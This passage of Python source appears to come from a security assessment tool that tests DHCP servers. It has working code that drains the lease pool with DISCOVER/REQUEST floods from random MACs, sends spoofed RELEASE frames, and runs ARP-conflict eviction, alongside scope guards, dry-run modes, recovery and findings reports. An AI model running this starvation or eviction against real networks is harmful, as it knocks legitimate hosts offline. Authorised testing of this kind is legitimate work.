        whose lease was released server-side keeps using its address until its own lease's T1
        and has no way to know anything happened, so this reads 0 even on a fully successful
        RELEASE. Re-acquisition (`_reacquire_phase()`) is the real test; see `_finish_release()`.
        """
        if self.cfg.dry_run or not ips:
            return 0
        time.sleep(1.0)  # give hosts/switch a moment before re-probing
        cidrs = [f"{ip}/32" for ip in ips]
        still_present, _ = self._discover_neighbors(cidrs)
        still_ips = {n.ip for n in still_present}
        return sum(1 for ip in ips if ip not in still_ips)

    def _baseline_arp_scan(self) -> None:
        """ARP-sweep the segment for a pre-run inventory of live hosts."""
        cidrs = self._sweep_cidrs()
        if not cidrs:
            self._debug("arp sweep skipped: could not determine a network range for the interface")
            return
        self._debug(f"arp sweep starting over {', '.join(cidrs)} (pre-run inventory)")
        found, _ = self._discover_neighbors(cidrs)
        self._baseline_neighbor_count = len(found)
        self._debug(f"arp sweep: {len(found)} host(s) present before exhausting")

    def _sweep_cidrs(self) -> list[str]:
        """Range for the *non-destructive* baseline sweep: explicit scope, else the iface network.

        Destructive modes never use this — they stay pinned to cfg.scope_cidrs so their blast
        radius can't be widened by an inferred range.
        """
        if self.cfg.scope_cidrs:
            return list(self.cfg.scope_cidrs)
        from .netutils import iface_network_cidr

        cidr = iface_network_cidr(self.cfg.interface)
        return [cidr] if cidr else []

    def _start_senders(self) -> None:
        # single sender: --rate is the pacing control, so extra threads only fought the limiter
        t = threading.Thread(target=self._exhaust_sender, daemon=True)
        t.start()
        self._threads.append(t)

    def _exhaust_sender(self) -> None:
        """Bounded pipeline: at most `self._window` DISCOVER/REQUEST transactions in flight.

        Replaces the old open-loop flood. On the run that motivated this: DISCOVERs were sent
        faster than handshakes could complete, so half-open allocations piled up in the
        server's pending-offer table until it started re-offering the same address to two of
        our MACs and then NAKing — a self-inflicted stall that looked like exhaustion but
        wasn't. Only an ACK counts as a held address; NAKs, duplicate offers, and timeouts
        shrink the window instead of being pushed through.
        """
        from .netutils import random_mac

        macs = list(self.cfg.client_macs) if self.cfg.client_macs else None
        while not self._stop.is_set():
            if self._halt_signal is not None:
                return  # a control fired — stop sending, leases stay held for the report
            # Offers flowed and then stopped: the pool *looks* drained. Provisional until the
            # post-run control transaction confirms a real client is also denied — which we now
            # go and do ourselves rather than waiting for the operator to press Stop.
            silence = time.time() - self._last_offer_ts
            if self._offers_seen_any and silence > self.cfg.timeouts.offer_silence:
                self.bus.emit(
                    ev.PoolExhausted(
                        leases=self.acks,
                        elapsed=time.time() - self._started,
                        confirmed=False,
                    )
                )
                self._trigger_halt(
                    "offer_silence", f"no OFFER for {silence:.0f}s after {self.acks} lease(s)"
                )
                return
            if self._offers_seen_any and silence > 2.0 and not self._silence_noticed:
                self._silence_noticed = True
                self.bus.emit(
                    ev.OffersCeased(
                        quiet_for=silence,
                        leases=self.acks,
                        deadline=self.cfg.timeouts.offer_silence,
                    )
                )
            self._reap_timeouts()
            with self._inflight_lock:
                room = self._window - len(self._inflight)
            if room <= 0:
                if self._stop.wait(0.02):
                    return
                continue
            mac = macs.pop(0) if macs else random_mac()
            if macs is not None:
                macs.append(mac)  # rotate through the provided list
            xid = _rand_xid()
            src = self._src_mac(mac)
            self._our_macs.add(src)
            pkt = packets.build_discover_v4(mac, xid, src)
            self._send(pkt)
            with self._inflight_lock:
                self._inflight[xid] = {"mac": mac, "sent_at": time.time(), "state": "DISCOVER_SENT"}
            self.discovers += 1
            self.bus.emit(ev.DiscoverSent(mac=mac, hostname=packets.packet_hostname(pkt)))
            self._debug(
                f"DISCOVER xid=0x{xid:08x} chaddr={mac} eth_src={src} flags=0x8000 "
                f"window={self._window} inflight={len(self._inflight)}"
            )
            # No extra sleep here beyond the window/rate-limit checks above: a fixed per-packet
            # sleep was the old bug (capped throughput no matter what was asked for).

    def _on_dhcp(self, pkt) -> None:
        try:
            if self._consume_control(pkt):  # belongs to the in-flight control transaction
                return
            # Server-origin types first: OFFER/ACK/NAK are never self-originated (we don't send
            # them), so they must never be run through the self-filter below, which relies on
            # xid membership in self._inflight -- exactly the xid a legitimate reply to our own
            # DISCOVER carries.
            if packets.is_offer(pkt):
                self._handle_offer(pkt)
            elif packets.is_ack(pkt):
                self._handle_ack(pkt)
            elif packets.is_nak(pkt):
                self._handle_nak(pkt)
            elif packets.is_decline(pkt):  # never self-originated -- same reasoning as above
                self._handle_client_decline(pkt)
            elif self._is_own_traffic(pkt):
                return  # our own DISCOVER/REQUEST/RELEASE, echoed back by the widened BPF (2.3)
            elif packets.is_discover(pkt):
                self._handle_foreign_discover(pkt)
            elif packets.is_request(pkt):  # (2.3, race-freed) NAK-address resolution only
                self._handle_foreign_request(pkt)
            else:
                from scapy.all import ARP

                if ARP in pkt:
                    self._handle_evict_arp(pkt)
        except Exception as exc:  # never let a bad packet kill the sniffer thread
            self.bus.emit(ev.ErrorEvent(message=f"parse error: {exc!r}"))

    def _is_own_traffic(self, pkt) -> bool:
        """True if `pkt` is a frame we sent ourselves, echoed back by the sniffer.

        The BPF widen (2.3) makes client->server traffic visible, including our own outbound
        DISCOVER/REQUEST/RELEASE and every other host's DHCP traffic. Two independent signals,
        either sufficient: the Ethernet source is one of ours (`_our_macs`, populated by
        `_exhaust_sender()` and `_control_transaction()`), or the xid belongs to one of our own
        in-flight transactions (the windowed sender's `_inflight`, or the control transaction's
        `_control_xid`) -- a foreign host choosing the exact same 32-bit xid is not realistic.
        Only meaningful for client-originated message types (DISCOVER/REQUEST/RELEASE/DECLINE);
        callers must not apply it to OFFER/ACK/NAK, which we never send.
        """
        from scapy.all import BOOTP, Ether

        if Ether in pkt and pkt[Ether].src in self._our_macs:
            return True
        if BOOTP in pkt:
            xid = pkt[BOOTP].xid
            with self._inflight_lock:
                if xid in self._inflight:
                    return True
            with self._control_lock:
                if self._control_xid is not None and xid == self._control_xid:
                    return True
        return False

    def _handle_foreign_discover(self, pkt) -> None:
        """Track a DHCPDISCOVER from a MAC that is not ours (2.3) -- goal 4's direct evidence.

        Only the first sighting per MAC is logged/emitted; a retrying client sends a fresh
        DISCOVER (usually a fresh xid) every few seconds and would otherwise flood the log.
        Every sighting is still tracked in `_foreign_discovers` by xid so `_handle_offer()` can
        mark it answered, and the counters keep moving either way.
        """
        from scapy.all import BOOTP

        try:
            if BOOTP not in pkt:
                return
            xid = pkt[BOOTP].xid
            if xid in self._foreign_discovers:
                return  # duplicate delivery of the same frame
            mac = packets.client_mac_from_offer(pkt)
            hostname = packets.packet_hostname(pkt)
            self._foreign_discovers[xid] = {
                "mac": mac,
                "hostname": hostname,
                "ts": time.time(),
                "answered": False,
            }
            first_sighting = mac not in self._foreign_discover_macs
            if first_sighting:
                # Emitted as its own event (rendered at verbosity >= 2 by the CLI/web layers,
                # like any other typed event) rather than through _debug() -- that's what keeps
                # this visible by default without needing -v3.
                self._foreign_discover_macs.add(mac)
                fp = resolve(extract_signature(pkt, role="client"), role="client")
                self._note_fingerprint(fp)
                self.bus.emit(ev.ForeignDiscover(mac=mac, xid=xid, hostname=hostname))
                # (2.3, race-freed) Weakest, opt-in trigger: this MAC is at INIT and has
                # abandoned the IP our ARP inventory recorded for it -- but the *server's*
                # binding isn't necessarily gone, hence off by default (race_on_rediscover).
                if self.cfg.race_on_rediscover:
                    neighbor = self._neighbors_by_mac.get(mac)
                    if neighbor is not None:
                        self._maybe_race(neighbor.ip, "rediscover")
            else:
                # Rate-limited: a retrying client would otherwise flood the log every few
                # seconds. Debug is gated to verbosity >= 3, well below the first sighting.
                self._debug(f"foreign DISCOVER xid=0x{xid:08x} chaddr={mac} (repeat sighting)")
        except Exception as exc:
            self.bus.emit(ev.ErrorEvent(message=f"foreign discover parse error: {exc!r}"))

    def _handle_offer(self, pkt) -> None:
        from scapy.all import BOOTP

        self.offers += 1
        self._offers_seen_any = True
        self._last_offer_ts = time.time()
        self._silence_noticed = False  # offers resumed; re-arm the quiet-period notice
        server_id, server_mac, offered_ip, subnet = packets.parse_offer(pkt)
        server = self.servers.get(server_id)
        if server is None:
            server = ServerInfo(server_id, server_mac, subnet, self.cfg.ip_version)
            fp = resolve(extract_signature(pkt, role="server"), role="server")
            fp.ip = server_id
            server.fingerprint = fp
            self.servers[server_id] = server
            self.bus.emit(ev.ServerDiscovered(server=server))
        server.offers_seen += 1
        xid = pkt[BOOTP].xid
        # BUG FIX (2.3, found while designing race-freed): this used to build and send a REQUEST
        # for *every* OFFER seen on the wire, with no check that the xid was ours. Since
        # client_mac_from_offer() reads chaddr straight off the OFFER, an offer meant for some
        # other real client on the segment made us send a REQUEST impersonating *their* MAC,
        # trying to steal their own offered address out from under them -- not scoped to
        # anything we deliberately targeted, just every offer the sniffer happened to see.
        # `xid in self._inflight` is the same ownership check `_handle_nak()` uses: populated
        # for every DISCOVER we actually sent (exhaust flood, re-acquisition, racing).
        with self._inflight_lock:
            info = self._inflight.get(xid)
            ours = info is not None
            if ours:
                info["state"] = "REQUEST_SENT"
                info["sent_at"] = time.time()  # restart the timeout clock for the ACK leg
        foreign = self._foreign_discovers.get(xid)
        if foreign is not None:
            foreign["answered"] = True  # legitimate to record either way -- we're not acting on it
        if not ours:
            self._debug(
                f"foreign OFFER xid=0x{xid:08x} yiaddr={offered_ip} server_id={server_id} "
                "(not ours, not requesting)"
            )
            return
        lease = Lease(
            packets.client_mac_from_offer(pkt),
            offered_ip,
            server_id,
            xid,
            self.cfg.ip_version,
        )
        self._note_offer_for_duplicate_detection(offered_ip, lease.mac)
        self._note_offer_for_pool_estimate(offered_ip, subnet)
        self.bus.emit(ev.OfferReceived(lease=lease, server=server))
        self._debug(
            f"OFFER xid=0x{pkt[BOOTP].xid:08x} yiaddr={offered_ip} server_id={server_id} "
            f"siaddr={pkt[BOOTP].siaddr} subnet={subnet} "
            f"chaddr={lease.mac} opts=[{_opts_summary(pkt)}]"
        )
        req = packets.build_request_v4(pkt, self._src_mac(lease.mac))
        self._send(req)
        self.bus.emit(
            ev.RequestSent(
                lease=lease, option50=offered_ip, hostname=packets.packet_hostname(req)
            )
        )
        self._debug(
            f"REQUEST xid=0x{pkt[BOOTP].xid:08x} requested_addr={offered_ip} server_id={server_id}"
        )

    def _handle_ack(self, pkt) -> None:
        """BUG FIX (2.3, found alongside the OFFER fix above): this used to register, journal,
        and count *every* ACK seen, ours or not. A foreign ACK we merely witnessed (possible
        whenever a server broadcasts, or after the OFFER bug above made us impersonate someone
        else's REQUEST) would land in `Cleanup` and the lease journal as if we held it -- so a
        later `restore()`/`release-previous` could send a RELEASE for an address a real,
        uninvolved client is actively using. Same `xid in self._inflight` ownership check."""
        from scapy.all import BOOTP, DHCP

        xid = pkt[BOOTP].xid
        with self._inflight_lock:
            ours = xid in self._inflight
            self._inflight.pop(xid, None)
        mac = packets.client_mac_from_offer(pkt)
        server_id, server_mac, ip, _ = packets.parse_offer(pkt)
        if not ours:
            self._debug(
                f"foreign ACK xid=0x{xid:08x} yiaddr={ip} server_id={server_id} chaddr={mac} "
                "(not ours, not registered)"
            )
            return
        lease_time = packets.lease_time_from(pkt[DHCP].options)
        lease = Lease(
            mac,
            ip,
            server_id,
            xid,
            self.cfg.ip_version,
            lease_time=lease_time,
            acquired_at=time.time(),
            server_mac=server_mac or None,
        )
        self.cleanup.register(lease)
        self._journal_ack(lease)
        self.acks += 1
        requested = self._reacquire_targets.get(xid)
        if requested is not None:
            outcome = "granted" if ip == requested else "offered_different"
            self._reacquire_outcomes[xid] = outcome
        self._consecutive_timeouts = 0  # a clean handshake resets the timeout-storm counter
        self._grow_window()
        self.bus.emit(ev.AckReceived(lease=lease))
        self._debug(
            f"ACK xid=0x{xid:08x} yiaddr={ip} server_id={server_id} "
            f"chaddr={mac} lease#{self.acks} opts=[{_opts_summary(pkt)}]"
        )

    def _handle_nak(self, pkt) -> None:
        """DHCPNAK: the server refused. Meaningful evidence, previously dropped on the floor.

        BUG FIX (2.3, found while designing race-freed): NAK is never self-originated (same
        reasoning as OFFER/ACK/DECLINE -- `_on_dhcp()` checks these before the self-filter, per
        AGENT_HANDOFF §8), so every NAK on the segment reaches this handler, including ones
        addressed to *other* clients. This used to count every NAK as ours regardless --
        `self.naks += 1`, `_shrink_window("nak")`, `_note_nak_for_burst_detection()` all ran
        unconditionally -- so a foreign client's NAK could shrink our send window and count
        toward the `nak_burst` halt signal (§5c), halting a run on someone else's traffic.

        `xid in self._inflight` is the ownership check: it's populated for every transaction we
        send (the exhaust flood and targeted re-acquisition both register there), so it reliably
        answers "is this NAK ours" without guessing from packet contents.
        """
        from scapy.all import BOOTP, DHCP

        xid = pkt[BOOTP].xid
        server_id = packets.server_identifier(pkt[BOOTP].siaddr, pkt[DHCP].options)
        with self._inflight_lock:
            ours = xid in self._inflight
            self._inflight.pop(xid, None)
        if not ours:
            self._debug(f"foreign NAK xid=0x{xid:08x} from {server_id} (not ours)")
            # (2.3, race-freed) A NAK carries no address of its own -- resolve it via whatever
            # foreign REQUEST for this xid _handle_foreign_request() tracked, if any.
            self._maybe_race(self._foreign_requests.pop(xid, None), "nak")
            return
        self.naks += 1
        if xid in self._reacquire_targets:
            self._reacquire_outcomes[xid] = "naked"
        self._shrink_window("nak")
        self._note_nak_for_burst_detection()
        self.bus.emit(ev.NakReceived(server_ip=server_id))
        self._debug(f"NAK xid=0x{xid:08x} from {server_id} opts=[{_opts_summary(pkt)}]")

    def _run_scan(self) -> None:
        # read-only: sniff + fingerprint. No DHCP REQUEST/RELEASE, no ARP conflict.
        self._sniffer = DhcpSniffer(self.cfg.interface, self.cfg.ip_version, self._on_scan)
        self._sniffer.start()

    def _on_scan(self, pkt) -> None:
        from scapy.all import ARP, DHCP, Ether

        try:
            if DHCP in pkt:
                role = "server" if packets.is_offer(pkt) or packets.is_ack(pkt) else "client"
                sig = extract_signature(pkt, role=role)
                fp = resolve(sig, role=role)
                if role == "client":
                    self._note_fingerprint(fp)  # may refresh an already-known neighbor row
                self.bus.emit(ev.HostFingerprinted(fp=fp))
                self._debug(
                    f"{role} {fp.mac} prl={sig.prl} vendor_class={sig.vendor_class!r} "
                    f"-> {fp.os or fp.device or '?'} ({fp.confidence}% via {fp.matched_via})"
                )
            elif ARP in pkt and pkt[ARP].op == 2:  # is-at
                self._note_neighbor(pkt[Ether].src, pkt[ARP].psrc)
        except Exception as exc:
            self.bus.emit(ev.ErrorEvent(message=f"scan parse error: {exc!r}"))

    def _run_active_scan(self) -> None:
        # active but non-destructive: ARP sweep + DHCP INFORM. Sniffer catches replies. Gated on
        # offline, not dry_run (2.3) -- active-scan sends nothing destructive in the first place,
        # so dry_run has nothing to suppress here; only offline should skip the sniffer/sends.
        if not self.cfg.offline:
            self._sniffer = DhcpSniffer(self.cfg.interface, self.cfg.ip_version, self._on_scan)
            self._sniffer.start()
            self._debug(f"active-scan sniffer started on {self.cfg.interface}")
        t = threading.Thread(target=self._active_scan_worker, daemon=True)
        t.start()
        self._threads.append(t)

    def _active_scan_worker(self) -> None:
        from .netutils import get_if_ip, random_mac

        neighbors, _ = self._discover_neighbors()  # benign ARP who-has across scope
        self._debug(f"active-scan: {len(neighbors)} host(s) responded to ARP")
        # Actively probe/fingerprint the DHCP server(s) with a single INFORM from our address.
        my_ip = get_if_ip(self.cfg.interface)
        if not my_ip or self.cfg.dry_run:
            my_ip = my_ip or "0.0.0.0"
        try:
            from scapy.all import get_if_hwaddr

            my_mac = get_if_hwaddr(self.cfg.interface)
        except Exception:
            my_mac = random_mac()
        xid = _rand_xid()
        inform = packets.build_inform_v4(my_mac, my_ip, xid, self.cfg.request_options)
        self._send(inform)
        self._debug(f"active-scan: sent DHCP INFORM ciaddr={my_ip} xid=0x{xid:08x}")
        # keep the sniffer collecting replies until stopped
        self._stop.wait()

    def _run_release(self) -> None:
        # (2.3, Phase 5) release now shares the exhaust chain -- control transaction,
        # re-acquisition and eviction all need to observe live replies, which the old ARP-only
        # release worker never provided a sniffer for (its ControlOutcome could never actually
        # succeed: nothing was listening for the OFFER/ACK). Mirrors _run_exhaust()'s offline
        # handling: offline skips the sniffer entirely (tests / no-root preview).
        if self.cfg.offline:
            self._debug("offline: sniffer disabled (no packets sent or received)")
        else:
            self._sniffer = DhcpSniffer(self.cfg.interface, self.cfg.ip_version, self._on_dhcp)
            self._sniffer.start()
            self._debug(f"sniffer started on {self.cfg.interface} (filter: dhcp/arp/icmp)")
        t = threading.Thread(target=self._release_worker, daemon=True)
        t.start()
        self._threads.append(t)

    def _release_worker(self) -> None:
        """New chain (2.3, Phase 5): ARP inventory -> control/self -> release -> re-acquisition
        -> eviction -- the exhaust chain minus the windowed sender, sharing `_common_prelude()`.
        Does not run the client="new" control leg (that is exhaust's starvation baseline and
        meaningless here); stores its control outcome in `self._rel_pre_control` rather than
        `self.control_pre`, so `_finalize_findings()` never derives a `DHCP_STARVATION_*`
        verdict from a release run -- see `_common_prelude()`'s docstring. Eviction runs inline
        here, before this thread exits, so the sniffer (stopped centrally in `stop()`) is still
        up to observe its signals -- unlike exhaust, `stop()` never calls `_evict_phase()` for
        this mode.
        """
        self._common_prelude(run_new_leg=False)
        if not self._stop.is_set():
            self._evict_phase()

    # ---------------------------------------------------------------- release-previous (2.2)
    def _run_release_previous(self) -> None:
        # needs the sniffer to receive the pre/post "can a new client get an address?" probes.
        # Gated on offline, not dry_run (2.3): the control transaction now probes for real under
        # dry_run alone, and a probe with no sniffer running to catch the reply always times out.
        if not self.cfg.offline:
            self._sniffer = DhcpSniffer(self.cfg.interface, self.cfg.ip_version, self._on_dhcp)
            self._sniffer.start()
            self._debug(f"release-previous: sniffer started on {self.cfg.interface}")
        t = threading.Thread(target=self._release_previous_worker, daemon=True)
        t.start()
        self._threads.append(t)

    def _select_release_previous_entries(
        self, entries: list, scope: ScopeGuard, pre_control: ControlOutcome
    ) -> tuple[list, dict]:
        """Filter journal entries down to what's safe and relevant to release right now.

        See EXECUTION-PLAN-release-previous.md §Phase 2 for why each step exists: interface,
        then current CIDR (never an unbounded sweep), then same-server (guards against a
        journal carried between engagements producing targets on the wrong network -- only
        evaluable when the pre-flight control actually learned a server identity, which it
        usually won't on a genuinely exhausted pool; that's an accepted gap, not a bug), then
        age (an optimisation -- a stale entry is harmless because its MAC simply won't match
        the server's current binding, see the module-level note in journal.py).
        """
        known_server_id = pre_control.server_id if pre_control.attempted else None
        same_server_filter_applied = bool(self.cfg.require_same_server and known_server_id)

        step1 = [e for e in entries if e.iface == self.cfg.interface]
        step2 = [e for e in step1 if scope.allows(e.ip)]

        if same_server_filter_applied:
            step3 = [e for e in step2 if e.server_ip == known_server_id]
        else:
            step3 = step2

        now = time.time()
        max_age_s = max(0.0, self.cfg.max_age_days) * 86400
        step4 = [e for e in step3 if now - (e.ts + (e.lease_time or 0)) <= max_age_s]

        stats = {
            "journal_entries_loaded": len(entries),
            "in_cidr": len(step2),
            "same_server_filter_applied": same_server_filter_applied,
            "same_server": len(step3),
            "within_max_age": len(step4),
            "selected": len(step4),
        }
        return step4, stats

    def _release_selected(self, entries: list) -> int:
        """Group by (server_ip, server_mac) so each batch unicasts to the right server --
        a journal can span multiple servers on the same segment (failover pairs, a second
        scope). Funnels through `_release_bindings()`, the one release send-path."""
        groups: dict[tuple[str, str | None], list[tuple[str, str]]] = {}
        for e in entries:
            groups.setdefault((e.server_ip, e.server_mac), []).append((e.mac, e.ip))
        sent = 0
        for (server_ip, server_mac), bindings in groups.items():
            if self._stop.is_set():
                break
            sent += self._release_bindings(bindings, server_ip, server_mac=server_mac)
        return sent

    def _release_previous_worker(self) -> None:
        """Replay the lease journal to recover a network this tool previously drained.

        No ARP sweep, no server discovery, no leasequery: the journal already carries mac,
        ip, server_ip and server_mac for every lease, so the release itself is fully
        self-sufficient from disk. The pre/post control transactions exist purely to produce
        a trustworthy verdict -- reused from `_control_transaction()`, not reimplemented.
        """
        # Read path is independent of self.journal_path (the *write* path, which is None
        # whenever journaling is off or this is a dry-run) -- release-previous must be able to
        # read the journal even when it wouldn't write to it, including under --dry-run.
        jpath = self.cfg.journal_path or journal.default_path(self.cfg.interface)
        all_entries, warnings = journal.load_open_leases(jpath)
        for w in warnings:
            self._debug(f"release-previous: journal warning: {w}")
        self._debug(f"release-previous: journal {jpath} — {len(all_entries)} open lease(s) loaded")

        cidrs = self._sweep_cidrs()
        if not cidrs:
            self._raise(
                Finding(
                    id="RELEASE_PREVIOUS_SCOPE_REQUIRED",
                    title="release-previous refused to run: no scope and no resolvable "
                    "interface network",
                    verdict=INCONCLUSIVE,
                    severity="medium",
                    evidence={"interface": self.cfg.interface},
                    recommendation=(
                        "Pass --scope explicitly, or run on an interface with a configured "
                        "IPv4 address, so the recovery sweep stays bounded to a known network."
                    ),
                )
            )
            return
        scope = ScopeGuard(cidrs)

        if self._stop.is_set():
            return
        pre = self._control_transaction("pre", client="new")
        self._rp_pre_control = pre
        if pre.success:
            self._raise(
                Finding(
                    id="NO_RECOVERY_NEEDED",
                    title="A new client already obtains an address — nothing to recover",
                    verdict=INFO,
                    severity="info",
                    evidence={
                        "interface": self.cfg.interface,
                        "journal_entries_loaded": len(all_entries),
                        "offered_ip": pre.offered_ip,
                    },
                    recommendation="No RELEASE frames were sent.",
                )
            )
            self.recovery_result = {"outcome": "not_needed", "frames_sent": 0}
            return

        selected, stats = self._select_release_previous_entries(all_entries, scope, pre)
        self._debug(
            "release-previous: selection — "
            f"{stats['journal_entries_loaded']} loaded, {stats['in_cidr']} in scope, "
            f"{stats['same_server']} same-server, {stats['within_max_age']} within max-age "
            f"-> {stats['selected']} to release "
            f"(same_server_filter_applied={stats['same_server_filter_applied']})"
        )

        if not selected:
            self._raise(
                Finding(
                    id="NO_JOURNAL_DATA",
                    title="No journal entries matched this network — nothing to recover",
                    verdict=INFO,
                    severity="info",
                    evidence={"interface": self.cfg.interface, **stats},
                    recommendation=(
                        "Either no prior run left an open lease here, or --scope / --max-age "
                        "/ --any-server need adjusting. release-previous only releases leases "
                        "this tool recorded taking — it cannot recover what it never recorded."
                    ),
                )
            )
            self.recovery_result = {"outcome": "no_data", "frames_sent": 0, **stats}
            return

        if self.cfg.dry_run:
            for e in selected:
                self._debug(
                    f"release-previous: [dry] would release {e.mac} {e.ip} via {e.server_ip}"
                )
            self.recovery_result = {"outcome": "dry_run", "frames_sent": 0, **stats}
            return

        frames_sent = 0
        passes = max(1, self.cfg.release_passes)
        for i in range(passes):
            if self._stop.is_set():
                break
            frames_sent += self._release_selected(selected)
            self._debug(f"release-previous: pass {i + 1}/{passes} — {frames_sent} sent so far")

        if self._stop.is_set():
            self.recovery_result = {"outcome": "interrupted", "frames_sent": frames_sent, **stats}
            return

        post = self._control_transaction("post", client="new")
        self._rp_post_control = post

        # re-fold the journal: how much of what we targeted is actually gone now?
        remaining_entries, _ = journal.load_open_leases(jpath)
        targeted_keys = {(e.mac, e.ip) for e in selected}
        remaining_targeted = [e for e in remaining_entries if (e.mac, e.ip) in targeted_keys]

        evidence = {
            **stats,
            "frames_sent": frames_sent,
            "passes_run": passes,
            "entries_still_open": len(remaining_targeted),
            "post_control_success": post.success,
            "post_control_reason": post.reason,
        }
        self.recovery_result = {
            "outcome": "recovered" if post.success else "failed",
            "frames_sent": frames_sent,
            **stats,
        }

        if post.success:
            self._raise(
                Finding(
                    id="POOL_RECOVERED",
                    title="A new client obtained an address after release-previous ran",
                    verdict=PASS,
                    severity="info",
                    evidence=evidence,
                    recommendation="Recovery confirmed. No further action needed.",
                )
            )
        elif remaining_targeted:
            self._raise(
                Finding(
                    id="POOL_RECOVERY_PARTIAL",
                    title="Some targeted leases were not released before the run ended",
                    verdict=INCONCLUSIVE,
                    severity="medium",
                    evidence=evidence,
                    recommendation=(
                        "Re-run release-previous to retry the remaining entries, or increase "
                        "--passes."
                    ),
                )
            )
        else:
            self._raise(
                Finding(
                    id="POOL_RECOVERY_FAILED",
                    title="Every targeted lease was released but a new client is still denied",
                    verdict=FAIL,
                    severity="high",
                    evidence=evidence,
                    recommendation=(
                        "The server did not honor these RELEASE frames, or something else is "
                        "denying new clients. Clear the bindings on the server itself — "
                        "'omshell' / lease-file edit + reload on ISC dhcpd, 'netsh dhcp server "
                        "scope <s> delete clientsbyip' or a scope reconcile on Windows Server "
                        "— or wait for the leases to expire."
                    ),
                )
            )

    def _discover_neighbors(
        self, cidrs: list[str] | None = None
    ) -> tuple[list[Neighbor], str | None]:
        """ARP-sweep for live neighbors (best effort; needs a real iface).

        `cidrs` defaults to cfg.scope_cidrs. Destructive callers MUST leave it unset so their
        targets stay pinned to the authorised scope.
        """
        import ipaddress
        import itertools

        from scapy.all import ARP, Ether, srp

        from .netutils import get_if_ip

        found: dict[str, Neighbor] = {}
        src_ip = get_if_ip(self.cfg.interface) or "0.0.0.0"
        targets: list[str] = []
        for cidr in (cidrs if cidrs is not None else self.cfg.scope_cidrs) or []:
            net = ipaddress.ip_network(cidr, strict=False)
            # BUG FIX (2.3): `list(net.hosts())[:1024]` materialized every host in the network
            # before slicing -- a /8 (as "lo" auto-detects to) means ~16M IPv4Address objects
            # built just to keep the first 1024, several real seconds of dead time before the
            # sweep even sends a packet. islice caps the work at 1024 regardless of network size.
            targets += [str(h) for h in itertools.islice(net.hosts(), 1024)]
        if not targets or self.cfg.offline:
            return list(found.values()), None
        try:
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=targets, psrc=src_ip),
                timeout=2,
                iface=self.cfg.interface,
                verbose=False,
            )
            for _, r in ans:
                found[r.psrc] = self._note_neighbor(r.hwsrc, r.psrc)
        except Exception as exc:
            self.bus.emit(ev.ErrorEvent(message=f"arp sweep error: {exc!r}"))
        return list(found.values()), None


def _rand_xid() -> int:
    import random

    return random.randint(1, 900000000)


# ARP-conflict eviction (2.3, Phase 4) outcome ladder, lowest to highest. This is a causal/
# temporal ordering, not a strength-of-evidence one: DECLINE is strong evidence on its own, but
# "rediscovered" (the host went further and restarted at INIT) is a later stage in the same
# eviction, so it outranks a bare decline. The top two rungs are exhaust-only -- release mode
# never drains the pool, so a healthy result there tops out at "rediscovered".
_EVICT_RUNGS = [
    "no_reaction",
    "defended",
    "declined",
    "rediscovered",
    "discover_unanswered",
    "apipa",
]


def _evict_rung_max(a: str, b: str) -> str:
    return b if _EVICT_RUNGS.index(b) > _EVICT_RUNGS.index(a) else a


def _opts_summary(pkt) -> str:
    """Compact 'name=value' dump of DHCP options for debug logging (skips pad/end)."""
    from scapy.all import DHCP

    if DHCP not in pkt:
        return ""
    parts: list[str] = []
    for o in pkt[DHCP].options:
        if isinstance(o, str):
            if o in ("end", "pad"):
                continue
            parts.append(o)
        elif isinstance(o, tuple):
            val = o[1] if len(o) == 2 else list(o[1:])
            parts.append(f"{o[0]}={val}")
    return " ".join(parts)
